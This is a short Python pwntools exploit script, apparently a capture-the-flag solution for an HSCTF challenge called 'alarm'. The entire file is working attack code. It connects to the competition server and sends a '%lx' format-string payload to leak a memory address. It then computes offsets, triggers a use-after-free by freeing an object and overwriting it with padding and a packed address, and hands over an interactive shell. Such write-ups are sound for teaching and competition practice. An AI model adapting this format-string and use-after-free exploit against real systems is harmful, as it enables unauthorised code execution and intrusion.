#!/usr/bin/env python

# import pwntools
from pwn import *

#open connection to remote server
r = remote("shell.hsctf.com", 10004)

#or debug locally
#r = process("./alarm", raw=false)

#print out initial help stuff
#print(r.recvuntil("$"))

#or not...
r.recvuntil("$")

#send the six %lx calls
r.sendline("a " + "%lx %lx %lx %lx %lx %lx ")
r.recvuntil ("$")
#get leak
r.sendline("n")
#snip out beginning
r.recvuntil("Alarm name: ")
leak = r.recvline()
#continue until prompt
r.recvuntil("$")


#leak is now the addresses all together in a string
addr = leak.split(" ")[5]

#format leak so it's more readable
print "leak: " + hex(int(addr, 16))

#calculate offsets
alarm_name = int(addr, 16) - 1222
what = alarm_name + 416

print "address of what: " + hex(what)

#prepare exploit

#create alarm
r.sendline("a a")

#free
r.sendline("d")

#create radio, format what_addr into a usable state
#note that what_addr is a str type, but what is a usable int type
r.sendline("r " + "A"*44 + p64(what))

#trigger exploit
r.sendline("i")

#return control to user
r.interactive()
